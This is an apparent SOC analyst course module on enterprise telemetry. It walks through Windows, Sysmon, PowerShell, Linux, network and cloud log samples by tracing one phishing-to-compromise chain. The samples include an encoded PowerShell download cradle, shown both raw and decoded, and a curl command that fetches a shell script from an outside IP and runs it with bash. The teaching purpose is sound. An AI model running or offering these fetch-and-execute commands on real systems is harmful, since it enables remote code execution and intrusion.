Enterprise Telemetry and Log Sources

Week 1 taught you how to think about an alert. This week teaches you where an alert's raw material actually comes from, and why the honest answer to "can we see that?" is usually "it depends which log you're looking at."

Focus: where evidence actually lives
Deliverable: telemetry map
Infra: Windows VM + Linux VM built this week
Orientation

The question that separates analysts who guess from analysts who know

"Could we have seen that?" is one of the most common questions asked after any security incident, in any organisation, anywhere in the world. This week teaches you to answer it correctly, before an incident forces the question on you.

Here is a scenario that plays out constantly in real SOCs. An incident happens. Leadership asks: "did anyone log into that server that night?" A junior analyst says "let me check the SIEM," searches, finds nothing, and reports back: "no logins occurred." That answer is dangerously incomplete, and it might be flatly wrong. The correct answer requires knowing something the junior analyst never stopped to ask: was that server even sending its logs anywhere? Was the specific event type that would show a login actually being collected? Had retention already aged out the window in question? "I searched and found nothing" and "that evidence never existed" are two completely different findings, and confusing them has caused real organisations to give false reassurance to their own leadership, their regulators, and their customers.

A mentor's honest take

A SIEM is often sold, and sometimes mentally treated by new analysts, as though it magically sees everything happening in an environment. It does not. A SIEM only ever knows about what somebody configured to be sent to it, in a format it was configured to understand, kept for as long as somebody decided to pay to store it. Every one of those is a human decision, made before you ever touched the alert. Understanding those decisions, and their limits, is the actual skill this week is building. Miss this, and you will spend your whole career trusting a tool that is only ever as complete as the humans who configured its inputs.

This week you will build the two virtual machines you will use for most of the rest of this programme: a Windows VM and a Linux VM. You will install Sysmon and enable PowerShell logging immediately, before generating any activity, for a reason that matters more than it sounds: telemetry only exists for what happened after logging was switched on. There is no way to retroactively recover visibility into something that already happened before you started watching. That single fact is why the very first thing every real SOC engagement does, whether it is a new client or a promotion into a new environment, is audit exactly what is currently being logged, before anything else.

Objectives

By the end of this week, you will be able to

  • Explain what each major telemetry source actually captures, in plain language, and give a realistic example of what its raw output looks like.
  • Explain why native Windows Event Logs alone are usually insufficient for real investigation, and specifically what Sysmon adds that Windows does not provide by default.
  • Read and interpret raw log lines from Windows Security Events, Sysmon, PowerShell logging, Linux syslog, journald, and auditd.
  • Trace a single simulated action, from execution to network callback, through the specific log entries it would generate across multiple sources.
  • Identify a visibility gap: a scenario where an attacker's action would not be captured by the logging currently configured, and explain why.
  • Explain why timestamps, field naming, and normalisation are not boring housekeeping details, but frequent, real causes of investigations going wrong.
  • Produce a professional telemetry map for a lab environment: source, fields, retention considerations, and investigative use.
The Big Picture

The visibility stack: five layers, one attacker trying to move through all of them unseen

Before the individual log sources, you need the map they all sit on. Every layer below is a different vantage point on the same organisation, and an attacker who is skilled will try to minimise their footprint at every one of them.

An attacker leaves some trace at almost every layer. Your job across this programme is learning to look at all five, not just the one your current tool happens to show you first.

Notice something important about this stack: no single layer tells the whole story on its own. Identity logs might show a successful login. Endpoint logs might show what that logged-in session then executed. Network logs might show where that execution then tried to communicate. A junior analyst who only ever checks one layer, usually whichever one their SIEM dashboard opens to by default, will consistently miss the parts of the story that live in the other four. This week walks through each layer in enough depth that you know exactly what evidence to expect from it, and just as importantly, what it will never be able to tell you.

Source 1

Windows Security Event Log: the default, and its real limits

Every Windows machine keeps a Security event log by default. It is a genuinely useful source, and it is also, on its own, nowhere near enough for real investigation. Understanding exactly why is the point of this section.

Windows organises what it logs using Event IDs, numeric codes that each mean a specific, fixed thing. You do not need to memorise all of them, but a working analyst needs immediate, reflexive recognition of the common ones, the way a doctor recognises common lab values without looking them up every time.

Event IDWhat it meansWhy it matters
4624An account successfully logged onYour baseline "who got in" event. Pay close attention to the Logon Type field (covered in the Identity section below).
4625An account failed to log onRepeated 4625s from one source are the classic brute-force signature you saw in Week 1's alert queue.
4688A new process was createdExtremely valuable, but only if command-line auditing is explicitly enabled. Off by default in many environments, which is a real, common visibility gap.
4720A user account was createdNew account creation is always worth understanding the context of, especially outside a scheduled onboarding process.
4728 / 4732A member was added to a global / local security groupThis is exactly what you triaged in Week 1's Domain Admins scenario.
4698A scheduled task was createdOne of the most common persistence mechanisms you will hunt for from Week 5 onward.
5140A network share object was accessedUseful for tracing lateral movement across file shares.
4776The domain controller attempted to validate credentials (NTLM)Useful for spotting NTLM authentication where Kerberos would be expected, itself sometimes a red flag.
raw Windows Security event, as you would see it in Event Viewer
Log Name: Security Source: Microsoft-Windows-Security-Auditing Event ID: 4688 Task Category: Process Creation Level: Information A new process has been created. Creator Subject: Account Name: T.EZE Account Domain: SACSCORP New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Process Command Line: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATw... Creator Process Name: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE

Sit with that last example for a moment, because it is one of the most important single log lines in this entire week. Notice the Creator Process Name: WINWORD.EXE, meaning Microsoft Word itself launched PowerShell. Word does not normally launch PowerShell during legitimate business use. Notice also the command line: -w hidden (hide the window) and -enc (a Base64-encoded command, a common way attackers obscure exactly what they are running from a casual glance). Three fields in one event line just told you a story: a user opened a document, that document's macro spawned a hidden, obfuscated PowerShell process. That is the single most common opening move behind real-world phishing-led compromises, and you just read it directly off a raw log line.

The gap nobody warns junior analysts about

Event ID 4688 only includes that rich Process Command Line field if an administrator has explicitly turned on command-line process auditing via Group Policy. In a huge number of real environments, this setting is off, because it was never turned on, not because anyone decided against it deliberately. Without it, 4688 still fires, but you only see that a process was created, with none of the command-line detail that actually tells you what happened. This single missing setting is one of the most common, entirely preventable visibility gaps in real organisations, and it is exactly why this programme installs Sysmon on your Windows VM this week rather than relying on native logging alone.

Source 2

Sysmon: seeing what Windows hides by default

Sysmon (System Monitor) is a free Microsoft Sysinternals tool that most professional SOCs treat as close to mandatory. It does not replace Windows' native logs, it fills in almost everything they leave out.

Event IDWhat it captures
1Process creation, including full command line, hashes, and parent process, by default, no Group Policy setting required
3Network connection: source, destination, port, and the initiating process
7Image or DLL loaded into a process
8CreateRemoteThread, a common process injection technique indicator
10ProcessAccess, one process opening a handle to another's memory (this is the LSASS access pattern from Week 1)
11File creation, including the file's original name if renamed
12 / 13 / 14Registry key or value created, modified, or renamed, key for spotting persistence
22DNS query performed by a process, extremely useful for tying a suspicious domain back to the exact process that asked for it
Sysmon Event ID 1, the same PowerShell launch, seen through Sysmon instead
Event ID: 1 (Process Create) UtcTime: 2026-08-21 10:02:14.311 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATw... ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE ParentCommandLine: "WINWORD.EXE" /n "C:\Users\T.Eze\Downloads\Invoice_2607.docm" Hashes: SHA256=1A79A4D60DE6718E8E5B326E338AE533... User: SACSCORP\T.EZE IntegrityLevel: Medium

Compare this to the 4688 example above. You get everything 4688 gave you, and critically, this is captured by default once Sysmon is installed, no Group Policy dependency. You also get the file hash (useful for later threat intelligence lookups from Week 13 onward) and the exact parent document filename, Invoice_2607.docm, which is itself a small but real clue: .docm is a macro-enabled Word document, and macro-enabled attachments are one of the most persistent phishing delivery mechanisms in use today, for the simple reason that they still work often enough to keep being used.

Why experienced SOC engineers treat Sysmon as close to non-negotiable

Ask almost any working detection engineer what single piece of free software gives the best security return for the least cost, and Sysmon is one of the most common answers you will hear. It costs nothing, it is a small, well-understood Microsoft-authored tool, and it turns a Windows endpoint from a machine you can barely see into one that produces genuinely investigable evidence. This is precisely why it is installed on your lab Windows VM this very week, before you generate a single test behaviour: everything from Week 5's detection engineering onward assumes this level of visibility exists.

Quick check: read the log, not the label Click an answer

Below is a real-looking Sysmon Event ID 3 (network connection). Read it fully before answering.

Sysmon Event ID 3
Event ID: 3 (Network Connect) UtcTime: 2026-08-21 10:02:19.887 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe User: SACSCORP\T.EZE DestinationIp: 91.243.44.18 DestinationPort: 443 Protocol: tcp
Given everything you have seen so far in this walkthrough (the WINWORD to PowerShell launch, then this outbound connection from PowerShell itself), what is the most defensible next step?

Correct: escalate and investigate further. Individually, PowerShell running and an HTTPS connection happening are both mundane. Chained together with the parent process being Microsoft Word, in sequence, within five seconds, this is precisely the shape of a real infection: document opens, macro launches PowerShell, PowerShell reaches out to fetch or report to something external. This is also a preview of exactly what Week 5 formalises as a testable detection.

Source 3

PowerShell logging: watching the tool attackers love the most

PowerShell is a legitimate, powerful Windows administration tool, and it is also, by a wide margin, one of the most abused tools in real-world intrusions, because it is already installed everywhere and can do almost anything.

Windows can log PowerShell activity at several levels of depth. The one that matters most for investigation is Script Block Logging (Event ID 4104), which records the actual code PowerShell executed, even if an attacker tried to obscure it with encoding or obfuscation, because Windows logs the code after it has been decoded and is about to run.

command line, as an attacker would send it
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgA0ADMALgA0ADQALgAxADgALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=

To a first glance, this tells you almost nothing. This is exactly why relying on the command line alone, without script block logging, is not enough: an attacker only needs a few seconds of obfuscation to defeat a human simply eyeballing the command.

Event ID 4104, Script Block Logging, decoded automatically by Windows
Event ID: 4104 (Script Block Logging) ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://91.243.44.18/stage2.ps1') Path: ScriptBlockId: 3f9a2e10-88c1-4a11-9b7e-1122334455aa

Now the intent is completely readable: download a second script from an external server and execute it immediately in memory (IEX is short for Invoke-Expression). This single technique, often called a "download cradle," is one of the most common early-stage patterns in real intrusions, precisely because it lets an attacker keep the actual malicious payload off disk until the very last moment, which also happens to be why endpoint file-scanning alone is not sufficient defence.

Common pitfall: assuming obfuscation defeats logging

New analysts sometimes assume that if a command is Base64-encoded or otherwise obfuscated, "the logs won't show what it really did." With script block logging enabled, this is usually false, PowerShell has to decode its own instructions before running them, and Windows captures that decoded form. The obfuscation defeats a human glancing at a command line. It does not defeat a properly configured log source. This is a genuinely reassuring fact once you know it, and a dangerous blind spot if you do not.

Source 4

Linux telemetry: syslog, journald, and auditd

Linux logging looks completely different from Windows, both in format and in philosophy, and you will need fluency in it for your Linux VM, for the servers many organisations run, and for the Zeek and Wazuh work later in this programme.

syslog: the long-standing standard

Traditional Linux systems write plain-text log lines to files under /var/log, following a loose but widely recognised format. The classic example every analyst should recognise on sight is an SSH authentication log line.

/var/log/auth.log, a failed then successful SSH login
Aug 21 02:14:01 web-srv-03 sshd[19822]: Failed password for root from 185.220.101.44 port 51190 ssh2 Aug 21 02:14:03 web-srv-03 sshd[19822]: Failed password for root from 185.220.101.44 port 51190 ssh2 Aug 21 02:14:07 web-srv-03 sshd[19844]: Accepted password for root from 185.220.101.44 port 51204 ssh2 Aug 21 02:14:07 web-srv-03 sshd[19844]: pam_unix(sshd:session): session opened for user root by (uid=0)

Notice the pattern: repeated failures against the root account (a red flag on its own, since direct root SSH login is bad practice almost everywhere and is usually disabled), followed immediately by a success from the same source. This is the Linux equivalent of the brute-force-then-success pattern from Week 1's alert queue, just from a completely different operating system and log format.

journald: the modern systemd-based approach

Most current Linux distributions (Ubuntu, RHEL/CentOS, and others) use systemd, which stores logs in a structured binary format queried with the journalctl command, rather than plain text files.

$ journalctl -u sshd --since "10 minutes ago"
Aug 21 02:14:07 web-srv-03 sshd[19844]: Accepted password for root from 185.220.101.44 port 51204 ssh2 Aug 21 02:14:08 web-srv-03 systemd-logind[712]: New session 44 of user root. Aug 21 02:15:51 web-srv-03 sudo[19901]: root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://91.243.44.18/payload.sh -o /tmp/.hidden.sh

The value of journald here is that it correlates cleanly across related system services, the SSH session, the login session manager, and the command actually executed by sudo, in one queryable timeline, without needing to cross-reference several separate plain-text files by hand.

auditd: the deepest layer, at the kernel's own doorstep

The Linux Audit daemon (auditd) can be configured to record system calls directly at the kernel level, the same category of depth that Sysmon provides on Windows. This is the tool you will configure on your Linux VM to get real process-execution visibility, not just what a shell chose to log about itself.

$ ausearch -k exec_watch (a labelled auditd rule watching process execution)
type=EXECVE msg=audit(1755741351.442:9981): argc=3 a0="/bin/bash" a1="/tmp/.hidden.sh" a2="" type=SYSCALL msg=audit(1755741351.442:9981): arch=c000003e syscall=59 success=yes exit=0 ppid=19901 pid=20011 auid=0 uid=0 gid=0 euid=0 comm="bash" exe="/bin/bash" key="exec_watch"

This confirms, at the kernel level, that the file downloaded via curl in the journald example above was then executed with bash. Notice that auid=0 (audit user ID, the original logged-in identity, which persists even through sudo) ties this action back to the same root session from the SSH login two log sources ago. This is exactly the kind of cross-source correlation a real investigation depends on, and exactly why this week deliberately shows you three different Linux log sources rather than just one.

Source 5

Network protocol telemetry: DNS, DHCP, HTTP, TLS, SSH, SMB, and RDP

You will go far deeper into network analysis in Weeks 8 and 9 with Wireshark, Zeek, and Suricata. This week's job is narrower: recognise what each of these protocols' logs looks like, and what question each one can answer.

ProtocolWhat its telemetry tells youTypical use in an investigation
DNSWhich domain names a host resolved, and whenFinding command-and-control domains, spotting DNS tunnelling, confirming whether a host ever actually tried to reach a suspicious domain
DHCPWhich IP address was assigned to which device (by MAC address) at a given timeTurning "IP address 10.20.4.201 did X" into "laptop belonging to T.Eze did X," since IPs are frequently reassigned
HTTPWeb requests: method, URL path, user agent, response codeConfirming what was actually requested from or served by a web server, and spotting suspicious user agents or request patterns
TLSEncrypted, but the handshake metadata (SNI, certificate details, JA3 fingerprinting) is still visibleIdentifying the destination even when the content is encrypted, and sometimes fingerprinting the client software itself

DNS server query log
2026-08-21 10:02:20 client 10.20.4.15#51022: query: analytics-cdn-edge7.net IN A + (10.20.0.5) 2026-08-21 10:02:20 client 10.20.4.15#51022: query: analytics-cdn-edge7.net IN A response: 91.243.44.18

This is the exact domain from Week 1's DNS beaconing alert. Notice this log alone confirms the resolution happened, and to which IP, but it does not tell you which process on the host asked for it, that detail lives in Sysmon Event ID 22 instead, which is exactly why cross-referencing sources matters.

DHCP server lease log
2026-08-21 06:58:03 DHCPREQUEST for 10.20.4.15 from 3c:22:fb:8a:11:9e (T-EZE-LAPTOP) via eth0 2026-08-21 06:58:03 DHCPACK on 10.20.4.15 to 3c:22:fb:8a:11:9e (T-EZE-LAPTOP) via eth0

This is what lets an investigator say, with confidence, that 10.20.4.15 was T.Eze's laptop at 06:58 that morning, not just "some device." Without DHCP logs retained for the relevant window, an IP-to-user mapping can become impossible to prove after the fact, particularly on networks where leases rotate frequently.

Nginx access log, combined format
91.243.44.18 - - [21/Aug/2026:10:02:21 +0100] "GET /stage2.ps1 HTTP/1.1" 200 4821 "-" "Mozilla/4.0 (compatible; MSIE 6.0)"

If this were a server you controlled being queried, the deliberately old, unusual user agent string is itself worth noticing, real modern browsers do not send this string; PowerShell's default web client historically did, and attackers sometimes forget or do not bother to change it.

Windows Event ID 1149, Remote Desktop Services authentication succeeded
Event ID: 1149 Source Network Address: 10.20.4.201 Account: SVC-BACKUP Domain: SACSCORP

This is the same service account and source IP from Week 1's brute-force alert. An RDP logon from a service account is itself unusual; service accounts typically run scheduled processes, not interactive remote desktop sessions.

Source 6

Authentication and identity logs: the Logon Type field you must never skip

Every Windows logon event carries a Logon Type number that tells you exactly how the authentication happened. This single field is one of the highest-value details in the entire Windows logging model, and it is frequently ignored by junior analysts.

Logon TypeMeaningInvestigative note
2Interactive (local keyboard/screen logon)Someone physically at the machine, or a very close local equivalent
3NetworkVery common and usually benign, for example accessing a file share, but also used by many lateral movement techniques
4BatchScheduled task execution
5ServiceA Windows service starting under an account's credentials
7UnlockWorkstation was unlocked, not a fresh logon
8NetworkCleartextCredentials sent in a recoverable form over the network, worth extra scrutiny
10RemoteInteractiveThis is RDP. Directly relevant to lateral movement hunting
11CachedInteractiveLogon using cached domain credentials, for example a laptop logging in without reaching a domain controller
Why this field alone can make or break an investigation

Go back to Week 1's after-hours database export alert, SOC-11205. The account logged in successfully with no corresponding badge entry. If you pulled the actual 4624 event and it showed Logon Type 10 (RemoteInteractive, meaning RDP) from an unfamiliar internal IP, that single field would immediately support the compromised-credentials theory far more strongly than a vague "she logged in somehow." This is exactly the kind of specific, field-level evidence that turns "I think this is suspicious" into "here is precisely how this happened," which is the difference between a triage guess and a real investigative finding.

Source 7

Firewall, proxy, VPN, and cloud audit telemetry

These are the sources that show activity crossing a boundary, between your network and the internet, between a user and a cloud platform, or between an untrusted device and your corporate resources.

perimeter firewall, outbound connection permitted
2026-08-21 10:02:19 ALLOW TCP src=10.20.4.15:51330 dst=91.243.44.18:443 rule="Allow-HTTPS-Outbound" bytes_sent=214 bytes_recv=4821

Firewalls typically log the decision (allow or deny), not the content. This is why network metadata tools like Zeek, covered in Week 9, exist as a complementary layer: the firewall confirms the connection was permitted, Zeek and packet capture reveal what actually passed through it.

VPN concentrator session log
2026-08-14 09:26:41 VPN-01: Tunnel established. User=CHIDI.OKAFOR ClientIP=41.203.88.12 AssignedIP=185.220.101.7 AuthMethod=MFA+Certificate

This is the exact log entry that resolved Week 1's "impossible travel" alert as a benign true positive. Notice it records both the real client IP (Nigeria-based) and the VPN-assigned internal IP (the Amsterdam-based address the SIEM saw), plus confirmation that MFA was used, all details that mattered directly to that earlier triage decision.

AWS CloudTrail event, abbreviated JSON
{ "eventTime": "2026-08-21T10:05:02Z", "eventName": "PutBucketPolicy", "userIdentity": { "arn": "arn:aws:iam::4021:user/t.eze" }, "sourceIPAddress": "91.243.44.18", "requestParameters": { "bucketName": "sacscorp-client-invoices", "policy": "{ \"Effect\": \"Allow\", \"Principal\": \"*\" ... }" } }

This entry shows a bucket policy change making a storage bucket publicly readable, requested from the same suspicious IP seen earlier in this week's walkthrough. Cloud audit logs like CloudTrail record the "who did what to which resource" story that on-premises firewall logs simply cannot, because the action happened entirely inside a cloud provider's control plane, never crossing your own network perimeter at all.

Azure AD (Entra ID) sign-in log, abbreviated
Sign-in time: 2026-08-21T10:01:03Z User: t.eze@sacscorp.com Application: Office 365 Exchange Online IP address: 102.89.44.201 Location: Lagos, NG Conditional Access: Success Risk level: Medium (unfamiliar sign-in properties)

Modern identity platforms increasingly compute their own risk score per sign-in, using signals like device familiarity and travel patterns. This is useful, but should never fully replace your own reasoning; a "Medium" risk score is an input to your judgement, from Week 1's Core Concept 3, not a replacement for it.

The Part Everyone Underestimates

Timestamps, fields, and data quality: the boring details that break real investigations

This section covers the least glamorous material in the whole week, and arguably causes more real investigative failures than any single technique you will learn later in this programme.

Timezones and clock drift

Every log source above showed timestamps. In a real multi-system investigation, those timestamps rarely arrive in the same timezone, or even the same format, by default. A Windows Event Log might show local time. A Linux syslog line might show UTC. A cloud audit log almost always shows UTC. If you build a timeline without normalising all of these to one common reference, you can produce an impossible sequence of events, or worse, a plausible but wrong one that nobody notices until much later.

A realistic failure this causes

Imagine a Lagos-based SOC (UTC+1) investigating a case involving a US-based cloud server logging in UTC, and a European VPN concentrator logging in its own local time (UTC+2 in summer). If an analyst treats all three timestamp columns as directly comparable without converting them, events that actually happened in a clean, logical order can appear scrambled, sometimes even appearing to happen "before" the action that caused them. This is not a hypothetical concern raised for effect; timezone-handling mistakes are a genuinely common, well-documented source of investigative errors, precisely because the fix (always normalise to UTC before building a timeline) is simple, but easy to forget under pressure.

Field naming: the same fact, a dozen different names

Different vendors name the same concept differently. A source IP address might appear as src_ip, source.ip, srcaddr, SourceAddress, or clientip, depending entirely on which product produced the log. This is precisely the problem that log normalisation and common schemas (such as the Elastic Common Schema, which you will meet properly when Wazuh is introduced in Week 4) exist to solve: mapping every vendor's own field names onto one consistent internal naming convention, so that a single search actually covers every relevant source instead of silently missing half of them because the field name did not match.

Retention: evidence has an expiry date, and someone chose it

Log retention is always a deliberate, cost-driven decision, hot storage (instantly searchable) is expensive, cold storage (archived, slower to retrieve) is cheaper, and many organisations delete logs entirely past a certain point to control cost. Regulatory standards frequently set minimums, for example PCI DSS has historically required at least one year of log retention with a minimum of three months immediately available for analysis. Knowing your own organisation's retention windows before an incident happens, not during one, is a basic professional habit worth building now.

Applied Practice

Hands-on: tracing one attack chain across every source you just learned

This is where every source above comes together. Below is a single, realistic phishing-to-compromise chain. Click each step to reveal exactly which telemetry source would prove it happened, and what that evidence would look like.

1
T.Eze receives and opens a phishing email with a macro-enabled attachment

Source: Email gateway / mail server logs (not covered in depth this week, formally addressed in Week 15 onward as part of threat intelligence and phishing scenarios), plus Windows Sysmon Event ID 1 showing WINWORD.EXE launching.

This is the earliest point at which any telemetry exists at all. If email gateway logging is not retained, this step may be permanently unrecoverable in a later investigation, reinforcing this week's opening point about visibility only existing from the moment logging began.

2
The macro spawns a hidden, obfuscated PowerShell process

Source: Sysmon Event ID 1 (Process Create), with WINWORD.EXE as ParentImage. Also Windows Event ID 4688, but only if command-line auditing is enabled, this is the exact gap flagged earlier in this week's Windows Security Log section.

This is the step examined in detail in the Sysmon section above.

3
PowerShell downloads and executes a second-stage script from an external server

Source: Windows Event ID 4104 (PowerShell Script Block Logging, showing the decoded download command), Sysmon Event ID 3 (Network Connect, showing the outbound HTTPS connection), and DNS query logs if a domain name rather than a raw IP was used.

This is the exact download cradle pattern shown in the PowerShell logging section above. Three independent sources corroborate the same single action, which is exactly the kind of multi-source confirmation a defensible investigation relies on.

4
The downloaded script creates a scheduled task for persistence

Source: Windows Event ID 4698 (A scheduled task was created), and Sysmon Event ID 1 showing schtasks.exe or a direct registry write captured by Sysmon Event IDs 12/13 if the task is created by manipulating the registry directly rather than through the standard API.

Persistence mechanisms are exactly what you will hunt for explicitly from Week 5 (detection engineering) and Week 10 (threat hunting) onward. Recognising this pattern now, at the raw telemetry level, is what makes those later weeks click quickly instead of feeling abstract.

5
The compromised host begins periodic outbound beaconing to a command-and-control server

Source: Sysmon Event ID 3 (repeated, regularly timed connections), firewall logs (confirming the connections were permitted outbound), and DNS query logs if domain-based. In Week 9, you will additionally see this exact pattern from Zeek's connection log and Suricata's alerting.

This is precisely the beaconing pattern from Week 1's alert queue, SOC-11203, now traced all the way back to its true origin: a single opened email attachment, five steps and multiple telemetry sources earlier.

What this trace was really teaching you

Notice that no single log source told the whole story. Each step needed a different vantage point, and several steps needed more than one source to be fully confirmed. This is the practical, working answer to the abstract idea from the Big Picture diagram earlier: real investigation is built by moving across the visibility stack, not by staring harder at one layer of it.

Applied Practice

Visibility gap exercise

Understanding what you cannot see is just as professionally important as understanding what you can. This exercise deliberately tests that.

An attacker runs a heavily obfuscated PowerShell command directly from an interactive command prompt (not from a macro, not from a script file). Command-line auditing (4688 detail) is NOT enabled in this environment. Select every source below that would still capture usable evidence of what the command actually did.
Windows Event ID 4688 (process creation, without command-line detail)
Sysmon Event ID 1 (process creation, full command line by default)
Windows Event ID 4104 (PowerShell Script Block Logging, decoded)
DHCP lease logs
The real lesson behind this exercise

Notice that 4688 without command-line auditing still fires, it will tell you a process was created, and roughly when, but not what it actually did. This is a genuine, non-hypothetical gap in many real environments right now. Part of your job as a working analyst is knowing which of your organisation's log sources have this kind of gap, so you never mistake "the SIEM shows nothing conclusive" for "nothing happened."

Telemetry map for the lab environment

Reference

Glossary

Telemetry▾

Any data automatically generated by a system describing its own activity, used here as the general term covering logs, events, and metadata from every source in this week.

Normalisation▾

The process of mapping different vendors' field names and formats onto one consistent internal schema, so searches and correlations work across all sources at once.

Download cradle▾

A short script or command whose only job is to fetch and execute a second, larger malicious payload from an external location, commonly implemented in PowerShell using Invoke-Expression.

Retention window▾

The length of time a given log source is kept before being archived or deleted, driven by storage cost, business need, and sometimes regulatory minimums.

Logon Type▾

A numeric field on Windows logon events describing exactly how the authentication occurred, for example interactively, over the network, or via Remote Desktop.
